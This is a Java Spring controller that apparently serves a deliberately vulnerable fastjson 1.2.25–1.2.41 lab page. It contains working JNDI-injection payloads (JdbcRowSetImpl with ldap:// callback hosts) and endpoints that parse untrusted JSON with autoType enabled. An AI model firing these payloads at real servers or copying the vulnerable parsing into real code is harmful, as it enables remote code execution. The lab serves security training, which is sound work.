package com.myapp;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class FastjsonController {

    @GetMapping(value = {"/", "/fastjson-1.2.25-1.2.41"}, produces = "text/html;charset=UTF-8")
    @ResponseBody
    public String index() {
        String normalPayload = "{\"name\":\"123\",\"email\":\"123@123\",\"age\":\"123\"}";
        String attack25 = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://fastjson125-dnslog.cn\",\"autoCommit\":true}}";
        String attack41 = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://fastjson125-141-setAutoTypeSupport-dnslog.cn\",\"autoCommit\":true}";

        return "<!DOCTYPE html>" +
                "<html lang=\"zh-CN\">" +
                "<head>" +
                "<meta charset=\"UTF-8\">" +
                "<title>fastjson-1.2.25-1.2.41 靶场测试页</title>" +
                styleBlock() +
                "</head>" +
                "<body>" +
                "<div class=\"container\">" +
                "<h1>fastjson-1.2.25-1.2.41 靶场测试页</h1>" +
                "<p class=\"hint\">每个面板都可以先填充 vul.py 中的样例 payload，再手动编辑，然后发送当前内容。</p>" +
                buildPanel("p25", "fastjson 1.2.25 - disableAutoTypeSupport", "/fastjson1.2.25-process", normalPayload, 1) +
                buildPanel("p41", "fastjson 1.2.41 - setAutoTypeSupport", "/fastjson1.2.41-process-setAutoTypeSupport", normalPayload, 1) +
                "</div>" +
                "<script>" +
                "const payloadConfigs={" +
                "p25:{path:'/fastjson1.2.25-process',attacks:['" + escapeForJs(attack25) + "'],normal:'" + escapeForJs(normalPayload) + "'}," +
                "p41:{path:'/fastjson1.2.41-process-setAutoTypeSupport',attacks:['" + escapeForJs(attack41) + "'],normal:'" + escapeForJs(normalPayload) + "'}" +
                "};" +
                "function payloadBox(id){return document.getElementById('payload-'+id);}" +
                "function resultBox(id){return document.getElementById('result-'+id);}" +
                "function fillAttack(id,index){payloadBox(id).value=payloadConfigs[id].attacks[index];}" +
                "function fillNormal(id){payloadBox(id).value=payloadConfigs[id].normal;}" +
                "async function sendCurrent(id){" +
                "const config=payloadConfigs[id];" +
                "const payload=payloadBox(id).value;" +
                "resultBox(id).textContent='当前 payload 请求发送中...';" +
                "try{" +
                "const response=await fetch(config.path,{method:'POST',headers:{'Content-Type':'application/json'},body:payload});" +
                "const text=await response.text();" +
                "resultBox(id).textContent='HTTP '+response.status+'\\n'+text;" +
                "}catch(error){resultBox(id).textContent='请求失败: '+error;}" +
                "}" +
                "</script>" +
                "</body>" +
                "</html>";
    }

    @PostMapping("/fastjson1.2.25-process")
    public String fastjson1_2_25_process(@RequestBody String data) {
        JSONObject jsonObject = JSONObject.parseObject(data);
        return "Processed: " + jsonObject;
    }

    @PostMapping("/fastjson1.2.41-process-setAutoTypeSupport")
    public String fastjson1_2_41_process(@RequestBody String data) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSON.parse(data);
        return data;
    }

    private String buildPanel(String id, String title, String path, String normalPayload, int attackCount) {
        StringBuilder buttons = new StringBuilder();
        for (int i = 0; i < attackCount; i++) {
            buttons.append("<button type=\"button\" class=\"attack\" onclick=\"fillAttack('")
                    .append(id)
                    .append("',")
                    .append(i)
                    .append(")\">填充攻击 Payload ")
                    .append(i + 1)
                    .append("</button>");
        }
        buttons.append("<button type=\"button\" class=\"normal\" onclick=\"fillNormal('")
                .append(id)
                .append("')\">填充正常 Payload</button>")
                .append("<button type=\"button\" class=\"send\" onclick=\"sendCurrent('")
                .append(id)
                .append("')\">发送当前 Payload</button>");

        return "<div class=\"panel\">" +
                "<h2>" + title + "</h2>" +
                "<p class=\"hint\">目标接口: <code>" + path + "</code></p>" +
                "<label for=\"payload-" + id + "\">当前 payload</label>" +
                "<textarea id=\"payload-" + id + "\">" + escapeHtml(normalPayload) + "</textarea>" +
                "<div class=\"actions\">" + buttons + "</div>" +
                "<label for=\"result-" + id + "\">响应结果</label>" +
                "<pre id=\"result-" + id + "\">等待发送请求...</pre>" +
                "</div>";
    }

    private String styleBlock() {
        return "<style>" +
                "body{font-family:Arial,sans-serif;margin:40px;background:#f5f7fb;color:#1f2937;}" +
                ".container{max-width:1100px;margin:0 auto;background:#fff;padding:24px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.08);}" +
                ".panel{border:1px solid #d0d7de;border-radius:12px;padding:18px;margin-top:20px;}" +
                ".actions{display:flex;flex-wrap:wrap;gap:12px;margin:16px 0;}" +
                "button{padding:10px 16px;border:0;border-radius:8px;cursor:pointer;font-size:14px;background:#1f6feb;color:#fff;}" +
                ".attack{background:#c0392b;}" +
                ".normal{background:#1f6feb;}" +
                ".send{background:#111827;}" +
                "textarea,pre{width:100%;box-sizing:border-box;}" +
                "textarea{min-height:140px;padding:12px;border-radius:8px;border:1px solid #d0d7de;margin-bottom:16px;resize:vertical;}" +
                "pre{min-height:120px;padding:12px;border-radius:8px;background:#111827;color:#e5e7eb;overflow:auto;}" +
                ".hint{color:#6b7280;font-size:14px;}" +
                "code{background:#eef2ff;padding:2px 6px;border-radius:4px;}" +
                "</style>";
    }

    private String escapeForJs(String value) {
        return value.replace("\\", "\\\\").replace("'", "\\'").replace("\r", "").replace("\n", "\\n");
    }

    private String escapeHtml(String value) {
        return value.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
    }
}
